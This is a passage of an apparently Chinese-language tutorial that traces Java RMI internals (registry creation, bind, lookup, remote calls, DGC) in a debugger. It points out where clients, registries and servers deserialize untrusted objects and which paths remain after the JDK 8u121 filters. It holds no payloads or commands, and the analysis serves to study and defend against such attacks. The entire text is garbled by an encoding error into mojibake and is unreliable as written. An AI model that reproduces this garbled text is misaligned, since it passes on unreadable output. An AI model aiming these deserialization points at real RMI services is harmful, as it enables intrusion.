ç»§ç»­è°ƒè¯•ï¼Œä¸‹é¢çš„å‚æ•°targetä¹Ÿæ˜¯ä¸€ä¸ªé›†æˆçš„ç›®å‰æœ‰ç”¨çš„ä¸œè¥¿ è·Ÿç€è°ƒè¯•åˆ°è¿™é‡Œï¼Œè°ƒç”¨äº†ä¸€ä¸ªé™æ€æ–¹æ³•ï¼ŒæŠŠtargetç»™æ”¾äº†è¿›å» ä¸€ç›´è·Ÿè¿›å»å¹¶å¾€ä¸‹èµ°ï¼Œä¼šå‘ç°æŠŠæ‰€æœ‰çš„æ•°æ®éƒ½æ”¾åˆ°äº†ç³»ç»Ÿçš„ä¸€ä¸ªè¡¨é‡Œé¢ æœ‰ä¸‰ä¸ªå€¼ï¼Œä¸€ä¸ªæ˜¯é»˜è®¤æ¯æ¬¡åˆ›å»ºçš„æ—¶å€™éƒ½æœ‰çš„ï¼Œä¸€ä¸ªæ˜¯æˆ‘ä»¬ä¹‹å‰åˆ›å»ºçš„è¿œç¨‹æœåŠ¡å¯¹è±¡ï¼Œè¿˜æœ‰ä¸€ä¸ªå°±æ˜¯æˆ‘ä»¬åˆšåˆšåˆ›å»ºçš„æ³¨å†Œä¸­å¿ƒï¼ˆç«¯å£æ˜¯å›ºå®šçš„ï¼‰ï¼Œä¸¤ä¸ªéƒ½ä¼šåˆ›å»ºä¸€ä¸ªstubç»™å®¢æˆ·ç«¯ç”¨ å®¢æˆ·ç«¯è¦æ˜¯æƒ³è®¿é—®æœåŠ¡ç«¯å°±éœ€è¦stubï¼Œæƒ³è®¿é—®æ³¨å†Œä¸­å¿ƒçš„è¯ä¹Ÿéœ€è¦æ‹¿é‚£ä¸ªstubæ¥è®¿é—® Okï¼Œä¸Šè¿°å°±æ˜¯åˆ›å»ºæ³¨å†Œä¸­å¿ƒçš„æµç¨‹ æ¥ä¸‹æ¥å°±æ˜¯ç»‘å®šçš„æµç¨‹ï¼Œæ¯”è¾ƒç®€å• åˆ°è¿™ä¸€æ­¥çš„æ—¶å€™æ³¨å†Œä¸­å¿ƒå’Œè¿œç¨‹å¯¹è±¡éƒ½æ˜¯å·²ç»åˆ›å»ºå®Œçš„ å¼ºåˆ¶æ­¥å…¥bindå‡½æ•°ï¼Œé¦–å…ˆæ˜¯æ£€æŸ¥ï¼Œé—®é¢˜ä¸å¤§ï¼Œéƒ½ä¼šé€šè¿‡ï¼Œç„¶åæ¥ä¸‹æ¥å°±æ˜¯ç»‘å®š å‚æ•°bindingså…¶å®å°±æ˜¯ä¸€ä¸ªå“ˆå¸Œè¡¨ï¼Œç°åœ¨æ˜¯ç©ºçš„ æ¥ä¸‹æ¥å°±æ˜¯æ£€æŸ¥è¡¨é‡Œé¢æ˜¯å¦å·²ç»æœ‰remoteObjï¼Œå·²å­˜åœ¨çš„è¯æ•‘æŠ¤æŠ›å‡ºå·²å­˜åœ¨çš„å¼‚å¸¸ï¼Œæ²¡æœ‰çš„è¯å°±putè¿›å» è¿™å°±æ˜¯ç»‘å®šçš„è¿‡ç¨‹ å®¢æˆ·ç«¯è¯·æ±‚æ³¨å†Œä¸­å¿ƒ-å®¢æˆ·ç«¯ é¦–å…ˆæ˜¯æŸ¥æ‰¾æ³¨å†Œä¸­å¿ƒï¼Œå¼ºåˆ¶æ­¥å…¥-æ­¥å…¥ï¼Œå¾€ä¸‹è°ƒè¯• åˆ›å»ºäº†ä¸€ä¸ªç±»LiveRefçš„å¯¹è±¡åå†è°ƒç”¨äº†createProxyå‡½æ•°ï¼Œè·Ÿä¸Šé¢åˆ›å»ºæ³¨å†Œä¸­å¿ƒçš„æ­¥éª¤ä¸­æ˜¯ä¸€æ¨¡ä¸€æ ·çš„ï¼Œåœ¨è‡ªå·±æœ¬åœ°ä¸Šä¸Šé¢åˆèµ·äº†ä¸€ä¸ªstubï¼Œè€Œä¸æ˜¯ç›´æ¥æ‹¿æ³¨å†Œä¸­å¿ƒçš„stubæ¥ç”¨ ç„¶åå°±å‡ºæ¥äº†ï¼Œregistryä¸ºRegistryImpl_Stubï¼Œå°±è·å–åˆ°äº†æ³¨å†Œä¸­å¿ƒçš„stubå¯¹è±¡ æ¥ç€è¿›è¿›è¡Œä¸‹ä¸€æ­¥ï¼šæŸ¥æ‰¾è¿œç¨‹å¯¹è±¡ æœåŠ¡ç«¯ç»‘åˆ°æ³¨å†Œä¸­å¿ƒä¸Šçš„å…¶å®ä¹Ÿæ˜¯ä¸€ä¸ªåŠ¨æ€ä»£ç†ï¼Œè¿™é‡Œçš„è¯å…¶å®å°±æ˜¯è·å–åˆ°é‚£ä¸ªåŠ¨æ€ä»£ç† ä½†æ˜¯è¿™è¾¹æœ‰ä¸ªé—®é¢˜å°±æ˜¯æˆ‘ä»¬è¿›ä¸åˆ°RegistryImpl_Stub.classæ–‡ä»¶ä¸­çš„lookupå‡½æ•°ï¼Œè¿™æ˜¯å› ä¸ºè¯¥æ–‡ä»¶çš„javaç‰ˆæœ¬æ˜¯1.1ï¼Œè€Œæˆ‘ä»¬æ˜¯1.8ï¼Œæ‰€ä»¥è°ƒè¯•ä¸äº†ï¼Œé‚£å°±ç›´æ¥çœ‹å§ ç¬¬ä¸€è¡Œå°±æ˜¯åˆ›å»ºä¸€ä¸ªè¿æ¥ï¼Œè¯¥å‡½æ•°ä¼ å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œé€šè¿‡var3.writeObject(var1);æŠŠå®ƒå†™å…¥äº†ä¸€ä¸ªè¾“å‡ºæµé‡Œï¼Œä¹Ÿå°±æ˜¯åºåˆ—åŒ–è¿›å»äº† super.ref.invoke(var2);å®Œæˆç½‘ç»œè¯·æ±‚ ObjectInput var6 = var2.getInputStream();var23 = (Remote)var6.readObject(); ä¹‹åä¼šè·å–ä¸€ä¸ªè¾“å…¥æµï¼Œä¹Ÿå°±æ˜¯æŠŠè¿”å›å€¼è·å–åˆ°äº†ï¼Œé€šè¿‡ååºåˆ—åŒ–çš„æ–¹å¼è¯»å–ï¼Œvar23å°±æ˜¯è¯»å›æ¥çš„è¿œç¨‹å¯¹è±¡çš„ä»£ç† æˆ‘ä»¬è¿™é‡Œå°±å¯ä»¥çŸ¥é“å®¢æˆ·ç«¯è·å–è¿œç¨‹å¯¹è±¡ä»£ç†çš„è¿‡ç¨‹æ˜¯é€šè¿‡ååºåˆ—åŒ–æ¥è·å–çš„ï¼Œé‚£ä¹ˆè¦æ˜¯æœ‰ä¸€ä¸ªæ¶æ„çš„æ³¨å†Œä¸­å¿ƒå°±å¯ä»¥é€šè¿‡è¿™ç§æ–¹å¼æ¥æ”»å‡»å®¢æˆ·ç«¯ å½“ç„¶é™¤äº†è¿™ä¸€ç§è¿˜æœ‰ä¸€ä¸ªåœ°æ–¹ï¼Œå°±æ˜¯ä¸Šé¢æåˆ°çš„invokeå‡½æ•° è¯¥invokeå‡½æ•°å…¶å®æ˜¯UnicastRef.javaæ–‡ä»¶ä¸­çš„ æ¥ç€ä¼šæ‰§è¡ŒexecuteCall()å‡½æ•°ï¼Œåœ¨è¿™é‡Œæ‰“ä¸€ä¸ªæ–­ç‚¹ è¯¥å‡½æ•°æœ‰ä»€ä¹ˆç‰¹åˆ«çš„åœ°æ–¹å‘¢ï¼Œå°±æ˜¯å½“ä½ çš„å¼‚å¸¸æ˜¯TransportConstants.ExceptionalReturnæ—¶ï¼Œå°±ä¼šé€šè¿‡ååºåˆ—åŒ–æ¥è·å–æµé‡Œé¢çš„å¯¹è±¡ è¿™é‡Œå¦‚æœè¯´ä½ çš„æ³¨å†Œä¸­å¿ƒè¿”å›ä¸€ä¸ªæ¶æ„çš„å¯¹è±¡ï¼Œç„¶åå®¢æˆ·ç«¯å°±ä¼šåœ¨è¿™é‡Œè¿›è¡Œååºåˆ—åŒ–ï¼Œå°±ä¼šå¯¼è‡´å®¢æˆ·ç«¯è¢«æ”»å‡» è¿™ä¸ªç‚¹ä¼šæ¯”æˆ‘ä»¬åˆšåˆšè¯´çš„é‚£ä¸ªæ™®é€šçš„ååºåˆ—åŒ–æ›´åŠ çš„éšè”½ï¼Œå½±å“ä¹Ÿæ›´å¹¿ï¼Œè¿™æ˜¯å› ä¸ºåªè¦è°ƒç”¨äº†invokeæ–¹æ³•çš„åœ°æ–¹éƒ½æœ‰å¯èƒ½ä¼šè¢«æ”»å‡»ï¼Œè€Œstubé‡Œé¢æ‰€æœ‰å¤„ç†ç½‘ç»œè¯·æ±‚çš„éƒ½ä¼šè°ƒç”¨è¿™ä¸ªæ–¹æ³• å…¶ä»–å‡½æ•°æ¯”å¦‚list()ï¼Œbindç­‰éƒ½ä¼šè°ƒç”¨invokeæ–¹æ³•ï¼Œä½†æ˜¯ä¸Šé¢çš„é‚£ä¸ªç›´æ¥ååºåˆ—åŒ–å¹¶æ²¡æœ‰å‡ºç°åœ¨æ‰€æœ‰çš„å‡½æ•°é‡Œé¢ï¼ŒèŒƒå›´æ›´å° å®¢æˆ·ç«¯è¯·æ±‚æœåŠ¡ç«¯-å®¢æˆ·ç«¯ä¹Ÿå°±æ˜¯åœ¨è¿™ä¸€æ­¥çš„æ—¶å€™ï¼Œæˆ‘ä»¬è·Ÿè¿›sayHelloæ–¹æ³• ç»“æœæ˜¯è·‘åˆ°è¿™é‡Œæ¥äº†ï¼Œè¿™æ˜¯ä¸ºä»€ä¹ˆå‘¢ è¿™æ˜¯å› ä¸ºæˆ‘ä»¬è·å–åˆ°çš„remoteObjæ˜¯ä¸€ä¸ªè¿œç¨‹åŠ¨æ€ä»£ç†ï¼Œè€ŒåŠ¨æ€ä»£ç†æ— è®ºè°ƒç”¨ä»€ä¹ˆæ–¹æ³•éƒ½ä¼šèµ°åˆ°è°ƒç”¨å¤„ç†å™¨é‡Œé¢çš„invokeæ–¹æ³• ä¼šèµ°åˆ°return invokeRemoteMethod(proxy, method, args);ï¼Œæˆ‘ä»¬è·Ÿè¿›å» èµ°åˆ°äº†ä¸€ä¸ªé‡è½½çš„invokeæ–¹æ³•å¤„ï¼Œæˆ‘ä»¬è·Ÿè¿›å» å‰é¢ä¸€éƒ¨åˆ†çš„é€»è¾‘è¿˜æ˜¯ä¸€æ ·çš„ï¼Œéƒ½æ˜¯åˆ›å»ºè¿æ¥ï¼Œç„¶åèµ°åˆ°marshalValueæ–¹æ³•ï¼Œä½œç”¨æ˜¯åºåˆ—åŒ–å€¼ ä»ä¸‹é¢æˆ‘ä»¬å¯ä»¥çŸ¥é“åºåˆ—åŒ–çš„æ˜¯æˆ‘ä»¬ä¼ è¿›æ¥çš„å‚æ•° åºåˆ—åŒ–å®Œåå°±åˆèµ°åˆ°äº†call.executeCall();ï¼Œæ‰€ä»¥å˜›å°±æ˜¯æ‰€æœ‰å®¢æˆ·ç«¯çš„è¯·æ±‚éƒ½ä¼šè°ƒç”¨è¿™ä¸ªæ–¹æ³• ç„¶åå¾€ä¸‹èµ°è¦æ˜¯è¯´æœ‰è¿”å›çš„å€¼çš„è¯ï¼Œå°±ä¼šè°ƒç”¨unmarshalValueæ–¹æ³• è€Œè¿™ä¸ªæ–¹æ³•ä¼šé€šè¿‡ååºåˆ—åŒ–æ¥è·å–ç»“æœ åœ¨è¿™ä¸ªéƒ¨åˆ†é‡Œé¢ä¹Ÿæ˜¯æœ‰ä¸¤ä¸ªååºåˆ—åŒ–ç‚¹çš„ï¼Œå’Œåˆšæ‰å®¢æˆ·ç«¯è¯·æ±‚æ³¨å†Œä¸­å¿ƒæ˜¯ç±»ä¼¼çš„ å®¢æˆ·ç«¯è¯·æ±‚æ³¨å†Œä¸­å¿ƒ-æ³¨å†Œä¸­å¿ƒç°åœ¨æ¥çœ‹ä¸€ä¸‹å®¢æˆ·ç«¯è¯·æ±‚æ³¨å†Œä¸­å¿ƒçš„æ—¶å€™æ³¨å†Œä¸­å¿ƒä¸Šé¢å‘ç”Ÿçš„äº‹æƒ…ï¼Œé€šè¿‡æ³¨å†Œä¸­å¿ƒè·å–è·å–è¿œç¨‹å¯¹è±¡çš„æ—¶å€™æ³¨å†Œä¸­å¿ƒæ˜¯æ€ä¹ˆå¤„ç†çš„ ä»ä¸Šé¢çš„é‚£ä¸ªæµç¨‹å›¾æˆ‘ä»¬å¯ä»¥æ˜ç™½åœ¨å®¢æˆ·ç«¯æˆ‘ä»¬ä¸€ç›´æ“ä½œçš„æ˜¯stubï¼Œæ‰€ä»¥æœåŠ¡ç«¯æ“ä½œçš„è‚¯å®šæ˜¯skeletonï¼Œæ‰€ä»¥æ–­ç‚¹è‚¯å®šæ˜¯è¦ä¸‹åœ¨æ–‡ä»¶RegistryImpl_Skel.classé‡Œé¢ å…·ä½“æ€ä¹ˆèµ°åˆ°è¿™ä¸ªæ–‡ä»¶é‡Œé¢çš„å¯ä»¥æ¥èµ°ä¸€é å‰é¢è‡ªå·±è·Ÿç€ç™½æ—¥æ¢¦ç»„é•¿çš„è§†é¢‘èµ°ä¸€ä¸‹ï¼Œåœ¨åˆ›å»ºæ³¨å†Œè¡¨çš„è¿‡ç¨‹ä¸­æœ€åä¼šè°ƒç”¨listen()å‡½æ•° listenå‡½æ•°çš„ä½œç”¨ä¸Šé¢éƒ¨åˆ†ä¹Ÿè®²è¿‡ï¼Œä¼šå¼€ä¸€ä¸ªç½‘ç»œç›‘å¬ï¼Œåœ¨å‡½æ•°ä¸­ä¼šå¼€ä¸€ä¸ªæ–°çš„çº¿ç¨‹ï¼Œè·Ÿè¿›å»ï¼Œçœ‹è¯¥çº¿ç¨‹çš„runæ–¹æ³• runæ–¹æ³•é‡Œé¢ä¹Ÿæ²¡æœ‰å…¶ä»–ä¸œè¥¿ï¼Œæ‰€ä»¥æˆ‘ä»¬ç»§ç»­è·Ÿè¿›å» è¯¥æ–¹æ³•ä¸­åˆåˆ›äº†ä¸€ä¸ªçº¿ç¨‹å€¼ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ç»§ç»­è·Ÿè¿›å» èµ°åˆ°äº†è¿™é‡Œä¹‹åï¼Œæˆ‘ä»¬å†çœ‹çœ‹å®ƒçš„runæ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•å®é™…ä¸Šå°±æ˜¯è°ƒç”¨run0æ–¹æ³• è·Ÿè¿›å»ï¼Œé‡ç‚¹çœ‹åº•ä¸‹çš„handleMessagesæ–¹æ³•ï¼Œè¯¥æ–¹æ³•å°±æ˜¯å¼€å§‹è¯»ä¸€äº›å­—æ®µï¼Œç„¶åæ ¹æ®ä¼ è¿‡æ¥çš„å­—æ®µå€¼åšå‡ºä¸åŒçš„æ“ä½œï¼Œé€šè¿‡switch-caseæ–¹æ³• é»˜è®¤çš„caseå€¼å¦‚ä¸‹ æˆ‘ä»¬è·Ÿè¿›serviceCallæ–¹æ³•ï¼Œå®ƒä¼šä»é™æ€çš„è¡¨é‡Œé¢è·å–targetï¼Œä¹‹å‰ä¸æ˜¯æœ‰è¯´è¿‡æœåŠ¡ç«¯ä¼šæŠŠåˆ›å»ºå¥½çš„ä¸œè¥¿éƒ½æ”¾åˆ°targetä¸­ï¼Œå†æ”¾åˆ°é™æ€è¡¨é‡Œé¢å»ï¼Œè¯¥æ–¹æ³•å°±æ˜¯è¿™ä¹ˆæŸ¥æ‰¾targetï¼Œæ‰€ä»¥æ–­ç‚¹ä¸‹åœ¨è¿™é‡Œ å¼€å¤´è®²äº†è¿™æ­¥æ˜¯é€šè¿‡æ³¨å†Œä¸­å¿ƒè·å–è·å–è¿œç¨‹å¯¹è±¡ï¼Œæ‰€ä»¥è¦è¿è¡Œå®¢æˆ·ç«¯çš„æ–‡ä»¶ï¼Œè¿è¡Œå®ŒåæœåŠ¡ç«¯ä¼šç›´æ¥è·‘åˆ°æˆ‘ä»¬è®¾çš„æ–­ç‚¹è¿™é‡Œï¼Œè¯´æ˜æˆ‘ä»¬å‰é¢èµ°çš„éƒ½æ˜¯æ²¡é”™çš„ å¾€ä¸‹è°ƒè¯•ï¼Œä¼šè·å–targeté‡Œé¢çš„åˆ†å‘å™¨dispï¼Œdispé‡Œé¢æœ‰skel ä¸‹ä¸€æ­¥å°±æ˜¯ä¼šè°ƒç”¨dispçš„dispatchæ–¹æ³•ï¼ˆåœ¨Transport.javaæ–‡ä»¶ä¸­ï¼‰ï¼Œæˆ‘ä»¬è·Ÿè¿›è¯¥æ–¹æ³•ä¸­ æ–¹æ³•ä¸­å½“skelä¸æ˜¯nullçš„æ—¶å€™è°ƒç”¨oldDispatchæ–¹æ³•ï¼Œè·Ÿè¿›å» è¯¥æ–¹æ³•ä¸­é‡ç‚¹å°±æ˜¯æœ€åä¼šè°ƒç”¨skelçš„dispatchæ–¹æ³•ï¼Œskelçš„å€¼æ˜¯RegistryImpl_Skelï¼Œæ‰€ä»¥å°±èµ°åˆ°äº†æˆ‘ä»¬è¿™éƒ¨åˆ†å¼€å¤´è¯´çš„é‚£é‡Œäº† åŒæ ·é‚£ä¸ªæ–‡ä»¶ä¸­çš„æ–¹æ³•ä¹Ÿæ˜¯è°ƒè¯•ä¸äº†çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬åªèƒ½ç›´æ¥çœ‹ æˆ‘ä»¬å¯ä»¥æŠŠæ³¨å†Œä¸­å¿ƒç†è§£ä¸ºä¸€ä¸ªç‰¹æ®Šçš„æœåŠ¡ç«¯ï¼Œæˆ‘ä»¬åœ¨å®¢æˆ·ç«¯å¤„ç†çš„ä¸€ç›´æ˜¯stubï¼Œç„¶åèµ°åˆ°æœåŠ¡ç«¯ä¹‹åå°±æ˜¯å¤„ç†skeleton æ–‡ä»¶RegistryImpl_Skel.classä¸­çš„dispatchæ–¹æ³•ä¸»è¦ç”¨çš„æ˜¯switch-caseé€»è¾‘ï¼Œä¸åŒçš„caseå€¼å¯¹åº”çš„æ–¹æ³•æ˜¯ä¸ä¸€æ ·çš„ï¼Œå…¶ä¸­case2å¯¹åº”çš„æ˜¯lookupæ–¹æ³•ï¼Œæ‰€ä»¥ç›®å‰æ¥è¯´æˆ‘ä»¬æ˜¯ä¼šè°ƒç”¨åˆ°case2 ä¹‹å‰æˆ‘ä»¬è¯´è¿‡å®¢æˆ·ç«¯ä»£ç IRemoteObj remoteObj = (IRemoteObj) registry.lookup(remoteObj);ä¸­çš„è¿œç¨‹å¯¹è±¡remoteObjæ˜¯åºåˆ—åŒ–ä¼ è¿‡å»çš„ï¼Œé‚£ä¹ˆæ³¨å†Œä¸­å¿ƒæ®µcase2ä¸Šé¢çš„readObjectå‡½æ•°å°±æ˜¯ååºåˆ—åŒ–è¯»å‡ºæ¥çš„ è¿™é‡Œå°±æ˜¯ä¸€ä¸ªååºåˆ—åŒ–ç‚¹ï¼Œæˆ‘ä»¬å®¢æˆ·ç«¯å¯ä»¥é€šè¿‡è¿™é‡Œååºåˆ—åŒ–æ”»å‡»æ³¨å†Œä¸­å¿ƒ å½“ç„¶åªè¦å…¶ä»–caseä¸­æœ‰readObjectå‡½æ•°çš„æˆ‘ä»¬éƒ½å¯ä»¥è¿›è¡Œæ”»å‡» å®¢æˆ·ç«¯è¯·æ±‚æœåŠ¡ç«¯-æœåŠ¡ç«¯æœ€åå®¢æˆ·ç«¯ç›´æ¥åœ¨æœåŠ¡ç«¯è°ƒç”¨è¿œç¨‹æ–¹æ³•çš„æ—¶å€™æœåŠ¡ç«¯æ˜¯æ€ä¹ˆå¤„ç†çš„å‘¢ï¼Œå®¢æˆ·ç«¯å°±æ˜¯äºè¿™éƒ¨åˆ†ä»£ç æœ‰å…³ç³» è¿™é‡Œçš„è¯å‰é¢è·Ÿç½‘ç»œç›¸å…³çš„é€»è¾‘éƒ½æ˜¯ä¸€æ ·çš„ å½“å‰è¯·æ±‚åˆ°çš„targetæ˜¯åŠ¨æ€ä»£ç†ï¼Œè¯·æ±‚åˆ°æœåŠ¡ç«¯äº†ï¼Œæˆ‘ä»¬å†æ¥çœ‹ä¸€ä¸‹æ¥ä¸‹çš„é€»è¾‘ ä¾ç„¶ä¼šèµ°åˆ°dispçš„dispatchæ–¹æ³•ï¼Œæˆ‘ä»¬è·Ÿè¿›å»ï¼Œä¸å‰é¢è¯·æ±‚æ³¨å†Œä¸­å¿ƒä¸ä¸€æ ·çš„æ˜¯è¿™æ¬¡æ–¹æ³•é‡Œé¢çš„numå€¼å°äº0 ç›´æ¥èµ°åˆ°è¿™ä¸€æ­¥ï¼Œè¿™æ˜¯å› æ­¤è¿™æ¬¡çš„skelæ˜¯ç©ºçš„ ç»§ç»­å¾€ä¸‹èµ°è·å–åˆ°è¾“å…¥æµï¼Œç„¶åè·å–åˆ°æ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å®šä¹‰çš„è¿œç¨‹æ–¹æ³•sayHello ç»§ç»­å¾€ä¸‹èµ°ï¼Œé‡è¦çš„åœ¨ä¸‹é¢ åœ¨ä¸Šé¢æœ‰æåˆ°å®¢æˆ·ç«¯ä¼ å…¥çš„å‚æ•°éƒ½æ˜¯åºåˆ—åŒ–ä¼ è¿›çš„ï¼Œç„¶ååœ¨æœåŠ¡ç«¯è¿™è¾¹å°±ä¼šååºåˆ—åŒ–å¾—åˆ° æœ€åè·å–åˆ°å‚æ•°å€¼ï¼Œå°±æ˜¯æˆ‘ä»¬ä¼ è¿‡æ¥çš„hello åœ¨è¿™é‡Œè¿›è¡ŒçœŸæ­£çš„æ–¹æ³•è¿œç¨‹è°ƒç”¨ï¼Œç„¶åå°±ç»“æŸäº† åé¢è¿˜æœ‰å°±æ˜¯è¿”å›å€¼ï¼Œä¼šæŠŠå®ƒç»™åºåˆ—åŒ–ï¼Œç„¶ååˆ°å®¢æˆ·ç«¯å†ååºåˆ—åŒ– å®¢æˆ·ç«¯è¯·æ±‚æœåŠ¡ç«¯-dgcdgcæ˜¯rmiçš„åˆ†å¸ƒå¼åƒåœ¾å›æ”¶çš„ä¸€ä¸ªæ¨¡å—ï¼Œä¸éœ€è¦çŸ¥é“å…·ä½“çš„ï¼Œåªè¦æŒ‰ç…§å’Œä¸Šé¢çš„ä¸€æ ·åˆ†æä¸€æ ·å°±è¦å¯ä»¥äº† å®ƒçš„ä½ç½®åœ¨åˆ›å»ºé™æ€è¡¨é‚£é‡Œï¼Œä¹Ÿå°±æ˜¯æ–‡ä»¶ObjectTable.javaä¸­ï¼Œåœ¨è¿™é‡Œæ‰“ä¸Šæ–­ç‚¹ å…¶ä¸­çš„dgcLogæ˜¯ä¸€ä¸ªé™æ€å˜é‡ï¼Œç„¶ååœ¨è°ƒç”¨ä¸€ä¸ªç±»çš„é™æ€å˜é‡çš„æ—¶å€™ä¼šå…ˆå®Œæˆå®ƒçš„åˆå§‹åŒ–çš„ åˆå§‹åŒ–çš„æ—¶å€™å®é™…ä¸Šæ—¶ä¼šè°ƒç”¨åˆ°å®ƒçš„é™æ€ä»£ç å—çš„ï¼Œä¼šèµ°åˆ°runå‡½æ•°ä¸­ï¼Œæ‰“ä¸ªæ–­ç‚¹ å¼€å§‹è°ƒè¯•ï¼Œå¯ä»¥çœ‹åˆ°ä¸‹é¢åˆ›å»ºstubçš„æ–¹æ³•å’Œåˆ›å»ºæ³¨å†Œä¸­å¿ƒæ˜¯ç±»ä¼¼çš„ï¼Œè‡ªå·±å¯ä»¥è·Ÿä¸€ä¸‹ è¿™è¾¹æˆ‘ä»¬å¾€ä¸‹èµ°å°±å¯ä»¥çŸ¥é“æ˜¯åˆ›å»ºäº†ä¸€ä¸ªDGCImpl_Stubç±»ï¼Œå®ƒçš„åŠŸèƒ½å’Œæ³¨å†Œä¸­å¿ƒæ˜¯ä¸€æ ·çš„ï¼Œæ³¨å†Œä¸­å¿ƒé‚£ä¸ªç«¯å£æ˜¯ç”¨æ¥æ³¨å†ŒæœåŠ¡ï¼Œå®ƒè¿™ä¸ªç«¯å£æ˜¯ç”¨æ¥è¿œç¨‹å›æ”¶æœåŠ¡ï¼Œå¹¶ä¸”è¿™ä¸ªç«¯å£æ˜¯éšæœºçš„ åˆ›å»ºå®Œäº†ä¹‹åå°±æŠŠå®ƒé›†åˆåˆ°targetä¸­ï¼Œç„¶åputè¿›å» ä¸Šé¢å°±æ˜¯dgcçš„åˆ›å»ºè¿‡ç¨‹ dgcè°ƒç”¨çš„æ—¶å€™ä¼šèµ°åˆ°dispé‡Œé¢ï¼Œå…·ä½“çš„æµç¨‹å’Œæ³¨å†Œä¸­å¿ƒæ˜¯ä¸€æ ·çš„ï¼Œè¿™é‡Œå°±ä¸åˆ†æäº† æˆ‘ä»¬é‡ç‚¹çœ‹ä¸€ä¸‹å®ƒçš„åŠŸèƒ½ æˆ‘ä»¬é¦–å…ˆçœ‹ä¸€ä¸‹å®¢æˆ·ç«¯DGCImpl_Stubé‡Œé¢çš„æ–¹æ³•ï¼Œæœ‰ä¸¤ä¸ªæ–¹æ³•cleanå’Œdirtyï¼Œå…¶å®å°±æ˜¯ä¸€ä¸ªæ¯”è¾ƒå¹²å‡€çš„æ¸…é™¤å’Œä¸€ä¸ªæ¯”è¾ƒå¼±çš„æ¸…é™¤ æˆ‘ä»¬ä¸éœ€è¦è¿‡åˆ†å…³æ³¨ï¼Œé‡ç‚¹çœ‹ä¸€ä¸‹å“ªé‡Œæ˜¯æœ‰é£é™©çš„ dirtyæ–¹æ³•ä¸­ä¹Ÿæœ‰è¿™è¡Œä»£ç super.ref.invoke(var5);ï¼Œè¯¥å‡½æ•°å‡½æ•°å…¶å®æ˜¯UnicastRef.javaæ–‡ä»¶ä¸­çš„ cleanæ–¹æ³•ä¸­ä¹Ÿæœ‰ å…·ä½“å¯ä»¥çœ‹æ ‡é¢˜ã€Šå®¢æˆ·ç«¯è¯·æ±‚æ³¨å†Œä¸­å¿ƒ-å®¢æˆ·ç«¯ã€‹ æ‰€ä»¥å°±æ˜¯è¯´æ‰€æœ‰çš„å®¢æˆ·ç«¯stubéƒ½æ˜¯å¯ä»¥è¢«ååºåˆ—åŒ–æ”»å‡»çš„ dirtyæ–¹æ³•ä¸­è¿˜æœ‰ä¸€å¤„ï¼Œå®ƒæ˜¯ä¼šä»æœåŠ¡ç«¯è·å–åˆ°ä¸€ä¸ªä¸œè¥¿ç„¶åååºåˆ—åŒ–å‡ºæ¥ï¼Œè·å–åˆ°çš„æ˜¯Leaseç±»çš„ä¸œè¥¿ ç»¼ä¸Šdgcå®¢æˆ·ç«¯å¯æ˜¯å¯ä»¥å—åˆ°ååºåˆ—åŒ–æ”»å‡»çš„ æ¥ä¸‹æ¥æˆ‘ä»¬å†æ¥çœ‹ä¸€ä¸‹æœåŠ¡ç«¯DGCImpl_Skel è¿™é‡Œæœ‰ä¸€ä¸ªæ–¹æ³•dispatchï¼Œé€šè¿‡switch-caseæ¥è°ƒç”¨dirtyå’Œcleanæ–¹æ³•ï¼šcase0è°ƒç”¨cleanï¼Œcase1è°ƒç”¨dirty æœåŠ¡ç«¯ä¸€æ ·çœ‹ä¸€ä¸‹æœ‰æ²¡æœ‰ååºåˆ—åŒ–ç‚¹ï¼Œå¦‚ä¸‹åŒæ ·æ˜¯æœ‰çš„ æ‰€ä»¥æœåŠ¡ç«¯ä¹Ÿæ˜¯ä¼šè¢«æ”»å‡»çš„ å’Œæ³¨å†Œä¸­å¿ƒä¸€æ ·ï¼Œæ— è®ºæ˜¯å®¢æˆ·ç«¯è¿˜æ˜¯æœåŠ¡ç«¯éƒ½ä¼šè¢«æ”»å‡» ä½†æ˜¯dgcæœ‰ä¸€ä¸ªç‰¹ç‚¹å°±æ˜¯å®ƒæ˜¯è‡ªåŠ¨ç”Ÿæˆçš„ï¼Œä¹Ÿå°±æ˜¯åªè¦åˆ›å»ºäº†è¿œç¨‹å¯¹è±¡å°±è‚¯å®šæœ‰ä¸€ä¸ªdgcæœåŠ¡ æ”»å‡»è¿œç¨‹å¯¹è±¡çš„è¯æ˜¯éœ€è¦çŸ¥é“å‚æ•°ç±»å‹çš„ï¼Œä½†æ˜¯dgcçš„è¯å°±ä¸éœ€è¦ JDKé«˜ç‰ˆæœ¬ç»•è¿‡éšç€ç‰ˆæœ¬çš„æ›´æ–°ï¼Œjdkå¯¹ä¸Šè¿°æˆ‘ä»¬æ‰€æåˆ°çš„ååºåˆ—åŒ–çš„ç‚¹éƒ½åšäº†ä¸€äº›é˜²å¾¡ 8u121æ€è·¯åœ¨RegistryImpl.javaæ–‡ä»¶ä¸­å®šä¹‰äº†ä¸€ä¸ªå‡½æ•°ï¼Œåœ¨è¾“å…¥æµå¤„å¤šåŠ äº†åˆ¤æ–­ åœˆå‡ºæ¥çš„ä»£ç æ˜¯è¯´åªæœ‰ä½ è¾“å…¥çš„ç±»å‹æ˜¯è¿™å‡ ç§ç±»æˆ–è€…æ˜¯ç»§æ‰¿äº†è¿™å‡ ç§ç±»çš„è¯æ‰å…è®¸ä½ ååºåˆ—åŒ– åœ¨DGCImpl.javaæ–‡ä»¶ä¸­é™åˆ¶å°±æ›´åŠ ä¸¥é‡äº† åªæœ‰åœˆå‡ºçš„è¿™å‡ ç±»æ‰å…è®¸ååºåˆ—åŒ– ç°åœ¨çš„è¯å°±æ˜¯è¿™ä¸¤æ¡è·¯éƒ½æ˜¯è¡Œä¸é€šçš„äº†ï¼Œä¹‹å‰è¿˜æœ‰è¯´è¿‡ä¸€æ¡è·¯æ˜¯è¿œç¨‹å¯¹è±¡ç›´æ¥ååºåˆ—åŒ– ä½†è¿™æ¡è·¯çš„è¯æ˜¯éœ€è¦ä½ çŸ¥é“è¿œç¨‹å¯¹è±¡çš„å…·ä½“å‚æ•°ç±»å‹æ‰å¯ä»¥ï¼Œä¸‹é¢å›¾ç‰‡ä¸­ç®­å¤´æ‰€æŒ‡çš„åœ°æ–¹ 